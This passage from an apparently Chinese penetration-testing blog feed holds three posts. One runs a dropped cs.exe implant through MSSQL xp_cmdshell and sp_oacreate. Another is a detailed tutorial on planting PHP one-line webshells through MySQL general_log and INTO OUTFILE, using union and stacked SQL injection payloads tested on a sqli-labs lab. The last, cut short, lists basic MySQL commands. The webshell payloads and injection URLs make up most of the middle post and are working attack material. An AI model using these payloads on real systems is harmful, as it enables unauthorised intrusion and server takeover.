<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/MSSQL%E4%B8%8D%E5%87%BA%E7%BD%91%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/640-165456952772020.png" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/MSSQL%E4%B8%8D%E5%87%BA%E7%BD%91%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/640-165456952772021.png" alt="图片"></p>
<p><strong>0x06 执行EXE上线</strong></p>
<p>这时再利用xp_cmdshell、sp_oacreate等方式去执行刚落地的cs.exe即可上线。这里我只是根据这种场景进行了简单的模拟测试，不出网主机上线方式可参考我之前分享的。</p>
<p><a href="http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247490086&idx=1&sn=14525c41cd3990554b324faec7364e72&chksm=cfa6be35f8d1372348f13148276b848ee0641364c99575233f0b6186f35ce73c5e15328208c1&scene=21#wechat_redirect">利用MSF上线断网主机的思路分享</a>、<a href="http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247490438&idx=1&sn=a2e71148beb114e4f2212203631598e7&chksm=cfa6bf95f8d13683bbd2f04a21865e16021447b3e6317a6b2dbbe23a8916337d20d941e284e6&scene=21#wechat_redirect">利用goproxy http上线不出网主机</a>、<a href="http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247490881&idx=1&sn=77b73f2ef31ec88db1da62168a21991f&chksm=cfa6b952f8d13044146692dbd1ac4f7a07d268cea003dd273d70ff5e8edc11cfe6b18bcab194&scene=21#wechat_redirect">利用Pystinger Socks4上线不出网主机</a> 。</p>
<p><strong>xp_cmdshell：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec master..xp_cmdshell &quot;cmd /c C:\\Windows\\temp\\cs.exe&quot;</span><br></pre></td></tr></table></figure>



<p><strong>sp_oacreate：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c C:\\Windows\\temp\\cs.exe&#x27;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/MSSQL%E4%B8%8D%E5%87%BA%E7%BD%91%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/640-165456952772022.png" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/MSSQL%E4%B8%8D%E5%87%BA%E7%BD%91%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/640-165456952772123.png" alt="图片"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL写马详解</title>
    <url>/posts/3e95d273.html</url>
    <content><![CDATA[<blockquote>
<p>转载自：<a href="https://forum.butian.net/share/362">https://forum.butian.net/share/362</a></p>
</blockquote>
<p># 日志写马 ## 条件 1.全局变量<code>general_log</code>为ON MySQL的两个全局变量： <code>general_log</code>指的是日志保存状态，一共有两个值（ON&#x2F;OFF）ON代表开启 OFF代表关闭。 &#96;general_log_fil…</p>
<h1 id="日志写马"><a href="#日志写马" class="headerlink" title="日志写马"></a>日志写马</h1><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>1.全局变量<code>general_log</code>为ON</p>
<p>MySQL的两个全局变量：</p>
<p><code>general_log</code>指的是日志保存状态，一共有两个值（ON&#x2F;OFF）ON代表开启 OFF代表关闭。</p>
<p><code>general_log_file</code> 指的是日志的保存路径。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mysql&gt; show <span class="keyword">global</span> variables like <span class="string">&quot;%general_log%&quot;</span>;</span><br><span class="line">+------------------+--------------------------------------------------------+</span><br><span class="line">| Variable_name    | Value                                                  |</span><br><span class="line">+------------------+--------------------------------------------------------+</span><br><span class="line">| general_log      | OFF                                                    |</span><br><span class="line">| general_log_file | D:\phpStudy\PHPTutorial\MySQL\data\DESKTOP-UQAMJKA.log |</span><br><span class="line">+------------------+--------------------------------------------------------+</span><br><span class="line"><span class="number">2</span> rows in <span class="title function_ invoke__">set</span> (<span class="number">0.02</span> sec)</span><br></pre></td></tr></table></figure>

<p>如果目前这个<code>general_log</code>为off状态，那么日志就没有被记录进去，所以要先打开这个全局变量。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global general_log=&#x27;on&#x27;;</span><br></pre></td></tr></table></figure>

<p>打开过后，日志文件中就会记录我们写的sql语句。我这里用sqli-labs来进行执行sql语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1%27%20union%20select%201,2,3--+</span><br></pre></td></tr></table></figure>

<p>打开<code>D:\phpStudy\PHPTutorial\MySQL\data\DESKTOP-UQAMJKA.log</code>日志文件，成功记录</p>
<p><a href="https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ba51a1eb042d738e1a61b0aee1c880f0e0820cae.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/MySQL%E5%86%99%E9%A9%AC%E8%AF%A6%E8%A7%A3/attach-ba51a1eb042d738e1a61b0aee1c880f0e0820cae.png" alt="img"></a></p>
<p>注：不管sql语句是否正确都会记录进去。</p>
<p>不过<code>general_log_file</code>可以直接通过SQL语句修改，而且必须修改为比如<code>php</code>后缀的文件，不然马不能被解析。下面讲第2点条件会详细说明。</p>
<p>2.需要<code>secure_file_priv</code>为空，即<code>secure_file_priv=&quot;&quot;</code>；或者<code>secure_file_priv</code>为<code>general_log_file</code> 日志的保存路径的磁盘。不过<code>general_log_file</code>可以直接通过SQL语句修改，必须要修改为比如<code>php</code>后缀的文件，不然马不能被解析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mysql&gt; set <span class="keyword">global</span> general_log_file=<span class="string">&#x27;D:/1.log&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">0</span> rows <span class="title function_ invoke__">affected</span> (<span class="number">0.07</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show variables like <span class="string">&quot;%general%&quot;</span>;</span><br><span class="line">+------------------+----------+</span><br><span class="line">| Variable_name    | Value    |</span><br><span class="line">+------------------+----------+</span><br><span class="line">| general_log      | ON       |</span><br><span class="line">| general_log_file | D:/<span class="number">1</span>.log |</span><br><span class="line">+------------------+----------+</span><br><span class="line"><span class="number">2</span> rows in <span class="title function_ invoke__">set</span> (<span class="number">0.03</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="comment">#注：其中路径里的\用\\或者/代替，因为\的话会消失一个</span></span><br><span class="line">mysql&gt; set <span class="keyword">global</span> general_log_file=<span class="string">&#x27;D:\1.log&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">0</span> rows <span class="title function_ invoke__">affected</span> (<span class="number">0.06</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show variables like <span class="string">&quot;%general%&quot;</span>;</span><br><span class="line">+------------------+---------+</span><br><span class="line">| Variable_name    | Value   |</span><br><span class="line">+------------------+---------+</span><br><span class="line">| general_log      | ON      |</span><br><span class="line">| general_log_file | D:<span class="number">1</span>.log |</span><br><span class="line">+------------------+---------+</span><br><span class="line"><span class="number">2</span> rows in <span class="title function_ invoke__">set</span> (<span class="number">0.03</span> sec)</span><br></pre></td></tr></table></figure>

<p>然后在D盘下就出现<code>1.log</code>成为新的日志文件了。但是最后也要考虑能不能成功的连接到马，像如果<code>secure_file_priv</code>固定为G:\，而网站是搭在D盘上，那把<code>general_log_file</code>修改为G盘下的文件也连接不到，除非还有文件包含漏洞等等。</p>
<p><code>show global variables like &#39;%secure%&#39;</code>;查看可以写入的磁盘。<br>（1）当secure_file_priv为空，就可以写入磁盘的目录。<br>（2）当secure_file_priv为G:\，就可以写入G盘的文件。<br>（3）当secure_file_priv为null，into outfile就不能写入文件。（注意NULL不是我们要的空，NULL和空的类型不一样）</p>
<p>secure_file_priv&#x3D;””就是可以into outfile写入任意磁盘文件。</p>
<p>secure_file_priv设置通过设置my.ini来配置，不能通过SQL语言来修改，因为它是只读变量，secure_file_priv设置具体看这里：</p>
<p>若secure_auth为ON，则用以下方法变为OFF（mysql查询默认是不区分大小写的）</p>
<p><a href="https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5242d13822b3bbbb2d0c8b96760af6ce1a13bba5.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/MySQL%E5%86%99%E9%A9%AC%E8%AF%A6%E8%A7%A3/attach-5242d13822b3bbbb2d0c8b96760af6ce1a13bba5.png" alt="img"></a></p>
<p>secure_file_priv不能通过此方法修改，因为报错为Variable ‘XXX’ is a read only variable。报错原因及修改方法为：<br>参数为只读参数，需要在mysql.ini配置文件中更改该参数，之后重启数据库</p>
<p><a href="https://shs3.b.qianxin.com/attack_forum/2021/08/attach-af151b954ae47b50288298c9a9a72b55d2eb7a57.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/MySQL%E5%86%99%E9%A9%AC%E8%AF%A6%E8%A7%A3/attach-af151b954ae47b50288298c9a9a72b55d2eb7a57.png" alt="img"></a></p>
<p>将secure_file_priv为空的正确方法（注意NULL不是我们要的空，NULL和空的类型不一样）</p>
<p><a href="https://shs3.b.qianxin.com/attack_forum/2021/08/attach-9410cb7535985a05f816233fc15434b4f98311c9.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/MySQL%E5%86%99%E9%A9%AC%E8%AF%A6%E8%A7%A3/attach-9410cb7535985a05f816233fc15434b4f98311c9.png" alt="img"></a></p>
<p>3.对web目录有写权限MS的系统就不说了，一般都会有权限的，但是linux的系统，通常都是rwxr-xr-x，也就是说组跟其他用户都没有权限写操作。</p>
<p>4.知道物理路径（into outfile ‘物理路径’), 这样才能写对目录。</p>
<p>查<code>select @@b asedir;</code>——MySQL数据库安装的绝对路径：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mysql&gt; select @@b asedir;</span><br><span class="line">+--------------------------------+</span><br><span class="line">| @@b asedir                      |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| D:/phpStudy/PHPTutorial/MySQL/ |</span><br><span class="line">+--------------------------------+</span><br><span class="line"><span class="number">1</span> row in <span class="title function_ invoke__">set</span> (<span class="number">0.07</span> sec)</span><br></pre></td></tr></table></figure>

<p>5.（1）union注入在这里行不通。</p>
<p>因为要日志写马能够连接必须要修改<code>general_log_file</code>为比如<code>php</code>后缀的文件，不然马不能被解析。所以必须要先用到<code>set global general_log_file=&#39;...php&#39;;</code>，那么union注入就没机会了，union基本都是<code>?id=1 union select 1,2,select &#39;&lt;?php assert($_POST[v]);?&gt;&#39;;</code>这样，不能执行<code>set</code>的。</p>
<p>（2）有堆叠注入，要先<code>?id=1;set global general_log_file=&#39;...php&#39;;</code>，然后直接执行<code>?id=1;select &#39;&lt;?php assert($_POST[v]);?&gt;&#39;;</code></p>
<p>不过首先要想有堆叠注入的条件，源码中必须要用到<code>mysqli_multi_query()</code>，那么我们此处就可以执行多个sql语句进行注入。一般后台查询数据库使用的语句都是用<code>mysql_query()</code>，所以堆叠注入在mysql上不常见。<code>mysqli_multi_query()</code>可以执行多个sql语句，而<code>mysqli_query()</code>只能执行一个sql语句。</p>
<p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p>
<p>（3）再者就是已经成功登录到别人的数据库里了，要先<code>set global general_log_file=&#39;...php&#39;;</code>，然后直接执行<code>select &#39;&lt;?php assert($_POST[v]);?&gt;&#39;;</code></p>
<p>6.对方没有对<code>&#39;</code>和<code>&quot;</code>进行过滤,因为outfile后面的物理路径必须要有引号</p>
<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p>例子：直接登录进别人的数据库的时候：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">set <span class="keyword">global</span> general_log_file=<span class="string">&#x27;...php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">select <span class="string">&#x27;&lt;?php assert($_POST[v]);?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>或者堆叠注入：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">set <span class="keyword">global</span> general_log_file=<span class="string">&#x27;...php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">?id=<span class="number">1</span>;select <span class="string">&#x27;&lt;?php assert($_POST[v]);?&gt;&#x27;</span>;</span><br><span class="line">或者直接?id=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[v]);<span class="meta">?&gt;</span>;都可以了，因为sql语句不管对错日志都会记录</span><br></pre></td></tr></table></figure>

<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>这里展示下堆叠注入的日志写马过程，用的是sqli-labs的靶场：</p>
<p>实战中堆叠注入来日志写马就不能用<code>show</code>来看全局变量的值了，所以就直接用sql语句修改。</p>
<p>1.先设置<code>general_log</code>为on：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-38/?id=-1&#x27; union select 1,2,3;set global general_log=&#x27;on&#x27;;--+</span><br></pre></td></tr></table></figure>

<p>2.再设置<code>general_log_file</code>为一个php后缀文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-38/?id=-1&#x27; union select 1,2,3;set global general_log_file=&#x27;D:\\phpStudy\\PHPTutorial\\WWW\\log.php&#x27;;--+</span><br></pre></td></tr></table></figure>

<p><strong>注：其中路径里的<code>\</code>用<code>\\</code>或者&#x2F;代替，因为<code>\</code>的话会消失一个</strong></p>
<p>在Navicat中查询可以看到真的被改了：</p>
<p><a href="https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7533d99f22ded66e7ae6e609a4e56f1284298eac.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/MySQL%E5%86%99%E9%A9%AC%E8%AF%A6%E8%A7%A3/attach-7533d99f22ded66e7ae6e609a4e56f1284298eac.png" alt="img"></a></p>
<p>可以看到这里必须要知道网站的绝对路径了。</p>
<p>3.<code>secure_file_priv</code>设置只能通过设置my.ini来配置，不能直接通过SQL语句来修改，因为它是只读变量。而且这里也不能<code>show</code>来看，所以只能看缘分~</p>
<p>4.<code>http://127.0.0.1/sqli-labs-master/Less-38/?id=1&#39;;select &#39;&lt;?php assert($_POST[v]);?&gt;&#39;;--+</code></p>
<p><a href="https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fd27f7a600ac8ff80b40a59459b07ec272db6a2b.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/MySQL%E5%86%99%E9%A9%AC%E8%AF%A6%E8%A7%A3/attach-fd27f7a600ac8ff80b40a59459b07ec272db6a2b.png" alt="img"></a></p>
<p>或者直接<code>?id=&lt;?php assert($_POST[v]);?&gt;;</code>都可以了，因为sql语句不管对错日志都会记录</p>
<p>5.最后可以用shell管理工具来连接了。比如我这里用蚁剑成功了：</p>
<p><a href="https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a0b8b309892938b9950b7a4ce1a628782a31c833.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/MySQL%E5%86%99%E9%A9%AC%E8%AF%A6%E8%A7%A3/attach-a0b8b309892938b9950b7a4ce1a628782a31c833.png" alt="img"></a></p>
<p>直接成功登录数据库的日志写马可以说是方法和堆叠注入的差不多，就是可以用<code>show</code>来看全局变量的值。这里就不赘述了。</p>
<h1 id="mysql-into-outfile注射一句话木马"><a href="#mysql-into-outfile注射一句话木马" class="headerlink" title="mysql into outfile注射一句话木马"></a>mysql into outfile注射一句话木马</h1><h2 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h2><p>关于mysql into outfile注射，要使用<code>into outfile</code> 把木马写到web目录拿到webshell首先需要有几个条件：</p>
<p>1.就是mysql用户拥有file_priv权限（不然就不能写文件或者读文件）</p>
<p><code>show global variables like &#39;%secure%&#39;</code>;查看into outfile可以写入的磁盘。<br>（1）当secure_file_priv为空，就可以写入磁盘的目录。<br>（2）当secure_file_priv为G:\，就可以写入G盘的文件。<br>（3）当secure_file_priv为null，into outfile就不能写入文件。（注意NULL不是我们要的空，NULL和空的类型不一样）</p>
<p>secure_file_priv&#x3D;””就是可以into outfile写入任意磁盘文件。</p>
<p>secure_file_priv设置通过设置my.ini来配置，不能通过SQL语言来修改，因为它是只读变量，secure_file_priv设置具体看这里：</p>
<p>若secure_auth为ON，则用以下方法变为OFF（mysql查询默认是不区分大小写的）</p>
<p><a href="https://shs3.b.qianxin.com/attack_forum/2021/08/attach-79bcf9a5c9c04f7fae1fb442b477c0559de9ff89.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/MySQL%E5%86%99%E9%A9%AC%E8%AF%A6%E8%A7%A3/attach-79bcf9a5c9c04f7fae1fb442b477c0559de9ff89.png" alt="img"></a></p>
<p>secure_file_priv不能通过此方法修改，因为报错为Variable ‘XXX’ is a read only variable。报错原因及修改方法为：<br>参数为只读参数，需要在mysql.ini配置文件中更改该参数，之后重启数据库</p>
<p><a href="https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4356e429a125909f12fbe3ffec2e1c96c4a4238e.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/MySQL%E5%86%99%E9%A9%AC%E8%AF%A6%E8%A7%A3/attach-4356e429a125909f12fbe3ffec2e1c96c4a4238e.png" alt="img"></a></p>
<p>将secure_file_priv为空的正确方法（注意NULL不是我们要的空，NULL和空的类型不一样）</p>
<p><a href="https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8e782037a570a7e3937b5297248720291126d5b6.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/MySQL%E5%86%99%E9%A9%AC%E8%AF%A6%E8%A7%A3/attach-8e782037a570a7e3937b5297248720291126d5b6.png" alt="img"></a></p>
<p>2.对web目录有写权限MS的系统就不说了，一般都会有权限的，但是linux的系统，通常都是rwxr-xr-x，也就是说组跟其他用户都没有权限写操作。</p>
<p>3.知道物理路径（into outfile ‘物理路径’), 这样才能写对目录。</p>
<p>查<code>select @@b asedir;</code>——MySQL数据库安装的绝对路径：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mysql&gt; select @@b asedir;</span><br><span class="line">+--------------------------------+</span><br><span class="line">| @@b asedir                      |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| D:/phpStudy/PHPTutorial/MySQL/ |</span><br><span class="line">+--------------------------------+</span><br><span class="line"><span class="number">1</span> row in <span class="title function_ invoke__">set</span> (<span class="number">0.07</span> sec)</span><br></pre></td></tr></table></figure>

<p>4.（1）能够使用union 。（需要mysql 3以上的版本）这个条件是在url里才需要，如果直接登录进别人的数据库，那么就不需要能够使用union了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">例子：</span><br><span class="line">?id=<span class="number">1</span> union select <span class="string">&#x27;&lt;?php @e val($_POST[&#x27;</span>c<span class="string">&#x27;]);?&gt;&#x27;</span> into outfile <span class="string">&quot;C:/phpStudy/WWW/a.php&quot;</span></span><br><span class="line"></span><br><span class="line">?id=<span class="number">1</span><span class="string">&#x27;)) UNION SELECT 1,2,&#x27;</span><span class="meta">&lt;?php</span> @e <span class="title function_ invoke__">val</span>(<span class="variable">$_POST</span>[<span class="string">&quot;v&quot;</span>]);<span class="meta">?&gt;</span><span class="string">&#x27; into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\hack.php&quot; --+</span></span><br></pre></td></tr></table></figure>

<p>（2）或者有堆叠注入，就可以直接<code>?id=1;select &#39;&lt;?php @e val($_POST[&#39;c&#39;]);?&gt;&#39; into outfile &quot;C:/phpStudy/WWW/a.php&quot;</code>这样执行了。</p>
<p>不过首先要想有堆叠注入的条件，源码中必须要用到<code>mysqli_multi_query()</code>，那么我们此处就可以执行多个sql语句进行注入。一般后台查询数据库使用的语句都是用<code>mysql_query()</code>，所以堆叠注入在mysql上不常见。<code>mysqli_multi_query()</code>可以执行多个sql语句，而<code>mysqli_query()</code>只能执行一个sql语句。</p>
<p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p>
<p>（3）再者就是已经成功登录到别人的数据库里了，直接执行<code>select &#39;&lt;?php @e val($_POST[&#39;c&#39;]);?&gt;&#39; into outfile &quot;C:/phpStudy/WWW/a.php&quot;</code></p>
<p>5.对方没有对<code>&#39;</code>和<code>&quot;</code>进行过滤,因为outfile后面的物理路径必须要有引号</p>
<p>所以，要满足这几个条件还是蛮高难度的。</p>
<p>如果都满足，写入成功了，那么就可以用shell管理工具进行Getshell了</p>
<h2 id="MySQL写入数据select-into-outfile一句话木马用法"><a href="#MySQL写入数据select-into-outfile一句话木马用法" class="headerlink" title="MySQL写入数据select into outfile一句话木马用法"></a>MySQL写入数据select into outfile一句话木马用法</h2><p>例子：直接登录进别人的数据库的时候：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">SELECT <span class="string">&quot;&lt;?php @e val(<span class="subst">$_POST</span>[&#x27;xiaohua&#x27;]); ?&gt;&quot;</span></span><br><span class="line">INTO OUTFILE <span class="string">&#x27;/tmp/test1.php&#x27;</span></span><br></pre></td></tr></table></figure>

<p>在url里要用union：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">例子：</span><br><span class="line">?id=<span class="number">1</span> union select <span class="string">&#x27;&lt;?php @e val($_POST[&#x27;</span>c<span class="string">&#x27;]);?&gt;&#x27;</span> into outfile <span class="string">&quot;C:/phpStudy/WWW/a.php&quot;</span></span><br><span class="line"></span><br><span class="line">?id=<span class="number">1</span><span class="string">&#x27;)) UNION SELECT 1,2,&#x27;</span><span class="meta">&lt;?php</span> @e <span class="title function_ invoke__">val</span>(<span class="variable">$_POST</span>[<span class="string">&quot;v&quot;</span>]);<span class="meta">?&gt;</span><span class="string">&#x27; into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\hack.php&quot; --+</span></span><br></pre></td></tr></table></figure>

<p>或者堆叠注入：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27;);SELECT &#x27;</span><span class="meta">&lt;?php</span> @e <span class="title function_ invoke__">val</span>(<span class="variable">$_POST</span>[<span class="string">&quot;v&quot;</span>]);<span class="meta">?&gt;</span><span class="string">&#x27; into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\hack.php&quot;;--+</span></span><br></pre></td></tr></table></figure>

<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>其中路径里的<code>\</code>用<code>\\</code>或者<code>/</code>代替，因为<code>\</code>的话会消失一个</p>
<h2 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h2><p>1.判断注入类型</p>
<p><code>http://127.0.0.1/sqli-labs-master/Less-7/?id=1&#39;</code> 报错<br><code>http://127.0.0.1/sqli-labs-master/Less-7/?id=1&#39;)) --+</code> 正常</p>
<p>2.判断列数</p>
<p><code>http://127.0.0.1/sqli-labs-master/Less-7/?id=1&#39;)) order by 3 --+</code> 正常</p>
<p><code>http://127.0.0.1/sqli-labs-master/Less-7/?id=1&#39;)) order by 4 --+</code> 报错</p>
<p>说明存在3列</p>
<p>3.文件写入</p>
<p>1.判断注入类型</p>
<p><code>http://127.0.0.1/sqli-labs-master/Less-7/?id=1&#39;</code> 报错<br><code>http://127.0.0.1/sqli-labs-master/Less-7/?id=1&#39;)) --+</code> 正常</p>
<p>2.判断列数</p>
<p><code>http://127.0.0.1/sqli-labs-master/Less-7/?id=1&#39;)) order by 3 --+</code> 正常</p>
<p><code>http://127.0.0.1/sqli-labs-master/Less-7/?id=1&#39;)) order by 4 --+</code> 报错</p>
<p>说明存在3列</p>
<p>3.文件写入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-7?id=1&#x27;)) UNION SELECT 1,2,&#x27;&lt;?php @e val($_POST[&quot;v&quot;]);?&gt;&#x27; into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\hack.php&quot; --+</span><br></pre></td></tr></table></figure>

<p>或者<code>&quot;D:/phpStudy/PHPTutorial/WWW/hack.php&quot;</code>，就是不能<code>\</code>，经过测试这样导入不成功。</p>
<p><a href="https://shs3.b.qianxin.com/attack_forum/2021/08/attach-552f39c375c5212fc08386ecd87c7c686fdc7942.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/MySQL%E5%86%99%E9%A9%AC%E8%AF%A6%E8%A7%A3/attach-552f39c375c5212fc08386ecd87c7c686fdc7942.png" alt="img"></a></p>
<p>上面的图中报了错：<code>You have an error in your SQL syntax</code>,显示sql出错了，但是没有关系，我们可以在文件中看到hack.php已经生成了。</p>
<p><a href="https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e0ef58e08c832fae54ed4ad81ae2f7aff1158d63.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/MySQL%E5%86%99%E9%A9%AC%E8%AF%A6%E8%A7%A3/attach-e0ef58e08c832fae54ed4ad81ae2f7aff1158d63.png" alt="img"></a></p>
<p>这时候用菜刀等webshell管理工具连接就可以了，我下面用的是蚁剑，可以看到连接成功。</p>
<p><a href="https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d89d62169c433e22a1227ad7104484a250df1de7.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/MySQL%E5%86%99%E9%A9%AC%E8%AF%A6%E8%A7%A3/attach-d89d62169c433e22a1227ad7104484a250df1de7.png" alt="img"></a></p>
<p>堆叠注入：<code>http://127.0.0.1/sqli-labs-master/Less-40/?id=1&#39;);SELECT &#39;&lt;?php @e val($_POST[&quot;v&quot;]);?&gt;&#39; into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\hack.php&quot;;--+</code></p>
<p>然后该目录下便生成了我们的马儿，用shell管理工具便可成功连接。从这里可以看到一定要知道网站的绝对路径。</p>
<p>直接成功登录数据库的into outfile写入一句话木马可以说是方法和前面两个的差不多，就是可以用<code>show</code>来看全局变量的值。这里就不赘述了。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Sql</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql基础命令</title>
    <url>/posts/d09cc855.html</url>
    <content><![CDATA[<h2 id="mysql-基础命令"><a href="#mysql-基础命令" class="headerlink" title="mysql 基础命令"></a>mysql 基础命令</h2><ol>
<li>登录mysql数据库</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -uroot -proot -P$port -h127.0.0.1				#账号root密码root本地连接</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>本地搭好mysql后，设置远程登录</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GRANT ALL ON *.* TO root@&#x27;%&#x27; IDENTIFIED BY &#x27;root&#x27; WITH GRANT OPTION;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>mysql三种退出方式</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exit;</span><br><span class="line">quit;</span><br><span class="line">\q;</span><br></pre></td></tr></table></figure>

<ol start="4">
